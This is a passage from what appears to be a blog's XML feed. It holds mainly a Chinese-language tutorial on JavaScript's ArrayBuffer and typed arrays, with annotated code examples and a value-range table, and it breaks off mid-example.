punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// &#123;age: 20, name: "Knight"&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种组合方式也基本成为了最理想的继承实现方式；</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面向对象编程 oop 构造函数 原型 继承 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript与二进制数据的恩怨情仇</title>
      <link href="/2024/09/27/javascript/javascript-yu-er-jin-zhi-shu-ju-de-en-yuan-qing-chou/"/>
      <url>/2024/09/27/javascript/javascript-yu-er-jin-zhi-shu-ju-de-en-yuan-qing-chou/</url>
      
        <content type="html"><![CDATA[<p>编程江湖，终日血雨腥风，论及二进制数据，又有多少豪杰谈笑风生，风生水起，水起船高，高深莫测……</p><p>不扯远了，想必谈到二进制数据，大家联想到的就会是 <code>1010110110001</code> 或者 <code>00000000 11111111 00000101</code> 这样的数据流；而这武林之中，号称三剑客之一的 <strong>JavaScript</strong>，在其行走江湖之际（日常开发），可能厮杀（处理）最多的类型就是直观的数字、字符串或者对象等；那么与极少露面的隐士（二进制）狭路相逢之时，它又将作何应对（描述与处理二进制数据）呢？是波澜壮阔，还是全身而退，抑或是力挽狂澜，且听本文中分解。</p><h1 id="ArrayBuffer"><a href="#ArrayBuffer" class="headerlink" title="ArrayBuffer"></a>ArrayBuffer</h1><p>未曾识得英雄面，只缘身在此山中；先来了解第一个概念，<code>ArrayBuffer</code> 表示的是一个原始二进制数据缓冲区（buffer），长度固定，并且内容是只读的；如果需要执行写操作，那么需要使用 <strong>类型化数组</strong>（<code>TypedArray</code>）或者 <strong>数据视图</strong>（<code>DataView</code>） 来实现；</p><p>知己知彼，方可百战百胜；在 JavaScript 中与二进制数据接触最紧密的可能就是 <code>ArrayBuffer</code> 了，之前讲目的是要描述和操作二进制数据，那么就要把这些数据先存放到某个地方，然后才能对其进行操作，这里的 ArrayBuffer 缓冲区就可以被看成这么一种地方；当然，可能最直观的方式就是将其保存到字符串中，如 <code>&quot;101011011&quot;</code>，又或者存入数组，如 <code>[1,0,1,0,1,1,0,1]</code>，这样确实是方便人类了，但是机器执行的效率也降低了，因为毕竟字符和数组是另外两种基本类型，并且也不是专门为此设计的；所以，就出现了专门为缓冲数据设计的 <code>ArrayBuffer</code>，并通过结合视图来提供一个访问和操作数据的接口；</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>实例化 <code>ArrayBuffer</code> 构造函数时，只接受一个参数，就是要创建的 Arraybuffer 的大小，单位是字节，不指定的话默认为 <strong>0</strong>；同时它也提供了一个实例属性 <code>byteLength</code>（只读），实现对当前 ArrayBuffer 字节值的访问；</p><p>举例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>buffer<span class="token punctuation">.</span>byteLength<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>另外，由于 ArrayBuffer 只是负责创建这么一段数据区域，并没有提供初始化赋值的接口，所以这 n 字节的数据都为空，即都置 0；</p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>由于 ArrayBuffer 构造函数本身是用于创建数据缓冲区，并且数据只读，所以提供的属性和方法也只有少数几个；</p><h3 id="slice"><a href="#slice" class="headerlink" title=".slice()"></a>.slice()</h3><p>用于返回一个新的缓冲区，语法为 <code>.slice(start, end)</code>，即以当前缓冲区为母本，从索引为 <strong>start</strong> 的位置开始，到 <strong>end</strong> 位置结束（end 位置不包含在内），然后复制并返回这一区段的数据；其用法大致与 <code>Array.prototype.slice()</code> 类似，举例说明：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> buffer1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> buffer2 <span class="token operator">=</span> buffer1<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> buffer3 <span class="token operator">=</span> buffer1<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> buffer4 <span class="token operator">=</span> buffer1<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>buffer2<span class="token punctuation">.</span>byteLength<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>buffer3<span class="token punctuation">.</span>byteLength<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>buffer4<span class="token punctuation">.</span>byteLength<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ArrayBuffer-isView"><a href="#ArrayBuffer-isView" class="headerlink" title="ArrayBuffer.isView()"></a>ArrayBuffer.isView()</h3><p>该方法用来判断所提供的参数值是否是一种 <code>ArrayBuffer</code> <strong>视图</strong>，比如类型化数组（TypedArray）和数据视图（DataView），例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ArrayBuffer<span class="token punctuation">.</span><span class="token function">isView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ArrayBuffer<span class="token punctuation">.</span><span class="token function">isView</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ArrayBuffer<span class="token punctuation">.</span><span class="token function">isView</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ArrayBuffer<span class="token punctuation">.</span><span class="token function">isView</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ArrayBuffer<span class="token punctuation">.</span><span class="token function">isView</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ArrayBuffer<span class="token punctuation">.</span><span class="token function">isView</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="类型化数组（TypedArray）"><a href="#类型化数组（TypedArray）" class="headerlink" title="类型化数组（TypedArray）"></a>类型化数组（TypedArray）</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>工欲善其事必先利其器；前面提到操作 <code>ArrayBuffer</code> 创建的数据缓冲区需要使用视图（view）实现，类型化数组就是这么一个描述二进制数据缓冲区（buffer）的视图（view），这个视图是一个 <strong>类数组</strong>。另外，不存在 <code>TypedArray()</code> 这个构造函数，它指的是一类数组，因此它有多种实现，即多个类型化数组构造器函数；可以姑且理解为 <em>水果</em> 之于 <em>苹果</em> 和 <em>香蕉</em>，水果指的是一类食物，都知道并不存在名为 <em>水果</em> 的一种具体食物，但是 <em>苹果</em> 和 <em>香蕉</em> 是具体存在的；</p><p>有效的类型如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">Int8Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 8 位二进制有符号整数</span><span class="token function">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 8 位无符号整数（超出范围后从另一边界循环）</span><span class="token function">Uint8ClampedArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 8 位无符号整数（超出范围后为边界值）</span><span class="token function">Int16Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 16 位二进制有符号整数</span><span class="token function">Uint16Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 16 位无符号整数signed</span><span class="token function">Int32Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 32 位二进制有符号整数</span><span class="token function">Uint32Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 32 位无符号整数</span><span class="token function">Float32Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 32 位 IEEE 浮点数（7 位有效数字，如 1.1234567）</span><span class="token function">Float64Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 64 位 IEEE 浮点数（16 有效数字，如 1.123...15)</span><span class="token function">BigInt64Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 64 位二进制有符号整数</span><span class="token function">BigUint64Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 64 位无符号整数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h2><p>万法不离其宗，一招一式都有迹可循；后面就都以 <code>Int8Array()</code> 为例进行说明，以下代码展示了可以传入的参数类型：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ES2017 中新增</span><span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span>typedArray<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span>buffer <span class="token punctuation">[</span><span class="token punctuation">,</span> byteOffset <span class="token punctuation">[</span><span class="token punctuation">,</span> length<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="无参数"><a href="#无参数" class="headerlink" title="无参数"></a>无参数</h3><p>最好的招式是没有招式；实例化构造函数时不传入任何参数，则返回一个空的类型化数组：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Int8Array []</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">.</span>byteLength<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">.</span>byteOffset<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="length"><a href="#length" class="headerlink" title="length"></a>length</h3><p>一寸长一寸强；传入一个数字类型的参数，表示申明类型化数组中元素的个数：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> _i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 字符串会先被转换成数字</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Int8Array(3) [0, 0, 0]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_i8<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Int8Array(3) [0, 0, 0]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">.</span>byteLength<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">.</span>byteOffset<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="typedArray"><a href="#typedArray" class="headerlink" title="typedArray"></a>typedArray</h3><p>好招不怕效仿；当传入的一个参数同样是一个类型化数组时，则返回一个原类型数组的拷贝（不是引用）：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> _i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span>i8<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8 <span class="token operator">==</span> _i8<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8 <span class="token operator">===</span> _i8<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_i8<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Int8Array(3) [0, 0, 0]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="object"><a href="#object" class="headerlink" title="object"></a>object</h3><p>海纳百川有容乃大；使用该参数时类似于用 <code>TypedArray.prototype.from()</code> 方法创建的类型数组，同时该方法也和 <code>Array.from()</code> 方法类似，即这个 <code>object</code> 参数是一个类数组的对象，或者是可迭代的对象；举例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 数组</span><span class="token keyword">var</span> i81 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i81<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Int8Array(3) [1, 2, 3]</span><span class="token comment">// 等价的操作</span><span class="token keyword">var</span> i81 <span class="token operator">=</span> Int8Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Int8Array(3) [1, 2, 3]</span><span class="token comment">// 类数组</span><span class="token keyword">var</span> i82 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token number">0</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token number">1</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>    <span class="token number">2</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>    <span class="token literal-property property">length</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i82<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Int8Array(3) [1, 2, 3]</span><span class="token comment">// 可迭代对象</span><span class="token keyword">var</span> i83 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i83<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Int8Array(3) [1, 2, 3]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="buffer-byteOffset-length"><a href="#buffer-byteOffset-length" class="headerlink" title="buffer, byteOffset, length"></a>buffer, byteOffset, length</h3><p>众人拾柴火焰高；该构造函数也支持同时提供三个参数，第一个 <code>buffer</code> 指的是数组缓冲区，是 <code>ArrayBuffer</code> 的实例，同时也是 <code>Int8Array.prototype.buffer</code> 这个属性的值；<code>butyOffset</code> 指的是元素的偏移值，表示从数组中第几个元素开始读取，默认是 0，也就是数组的第一个元素；<code>length</code> 指的是在设置了偏移值后，要读取的元素长度，默认是整个数组的长度；举例说明：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>buffer<span class="token punctuation">;</span><span class="token keyword">var</span> i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Int8Array(2) [2, 3]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是让申明的类型化数组在提供的 <code>buffer</code> 的基础上，从它的索引为 <strong>1</strong> 的元素（第二个元素）开始读取，然后向后读取 <strong>2</strong> 个元素；该操作一般用于对缓冲区数据的截取；</p><h2 id="类型差异"><a href="#类型差异" class="headerlink" title="类型差异"></a>类型差异</h2><p>存在即合理；根据前面的介绍，<code>TypedArray</code> 定义了多种类型，如 <code>Int8Array</code>, <code>Uint8Array</code>, <code>Int16Array</code> 等，这样做也是为了适应不同的应用场景，接下来大致了解一下几个典型的类型化数组之间的区别；</p><h3 id="有无符号"><a href="#有无符号" class="headerlink" title="有无符号"></a>有无符号</h3><p>以 <code>Int8Array</code> 和 <code>Uint8Array</code> 为例，其实 <strong>有符号</strong> 的意思是数组中的元素可以存在符号，即可以是负数；因此 <strong>无符号</strong> 的意思就是元素只能是非负数，举例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> _i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> ui8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> _ui8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Int8Array(3) [1, 2, 3]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_i8<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Int8Array(3) [-1, -2, -3]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ui8<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Uint8Array(3) [1, 2, 3]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_ui8<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Uint8Array(3) [255, 254, 253]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现有符号类型之处初始化负数元素，而无符号则会对负数进行转换，具体转换方式后面会提到；</p><h3 id="元素范围"><a href="#元素范围" class="headerlink" title="元素范围"></a>元素范围</h3><p>有无符号的类型数组，除了元素的值的正负区别外，元素的取值范围也有所不同；下面是一份具体的清单：</p><table><thead><tr><th>Type</th><th>Range</th></tr></thead><tbody><tr><td>Int8Array</td><td>-128 ~ 127</td></tr><tr><td>Uint8Array</td><td>0 ~ 255</td></tr><tr><td>Uint8ClampedArray</td><td>0 ~ 255</td></tr><tr><td>Int16Array</td><td>-32768 ~ 32767</td></tr><tr><td>Uint16Array</td><td>0 ~ 65535</td></tr><tr><td>Int32Array</td><td>-2147483648 ~ 2147483647</td></tr><tr><td>Uint32Array</td><td>0 ~ 4294967295</td></tr><tr><td>Float32Array</td><td>1.2×10-38 ~ 3.4×1038</td></tr><tr><td>Float64Array</td><td>5.0×10-324 ~ 1.8×10308</td></tr><tr><td>BigInt64Array</td><td>-263 ~ 263-1</td></tr><tr><td>BigUint64Array</td><td>0 ~ 264-1</td></tr></tbody></table><p>可以看出，为了顾及有无符号类型的单个元素取值范围区间一样，所以就调整了它们的取值上下限；</p><h3 id="字节位数"><a href="#字节位数" class="headerlink" title="字节位数"></a>字节位数</h3><p>以有符号类型为例，可以发现有 <code>Int8Array</code>, <code>Int16Array</code> 等几个不同的类型数组，唯一的区别就是他们构造函数名字中间的数字不同，其实这个数字指的是实例化后的类型化数组的单个元素的大小，即多少位，<strong>8</strong> 就是 8 位，即一字节，<strong>16</strong> 就是 2 字节，类推；其实，这个数字也反应了类型数组中 <code>BYTES_PER_ELEMENT</code> 这个属性的值，从名字也可以看出代表的是每个元素的字节数；举例说明：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> i16 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int16Array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> i32 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int32Array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">.</span><span class="token constant">BYTES_PER_ELEMENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i16<span class="token punctuation">.</span><span class="token constant">BYTES_PER_ELEMENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i32<span class="token punctuation">.</span><span class="token constant">BYTES_PER_ELEMENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 4</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i16<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i32<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">.</span>byteLength<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i16<span class="token punctuation">.</span>byteLength<span class="token punctuation">)</span><span class="token 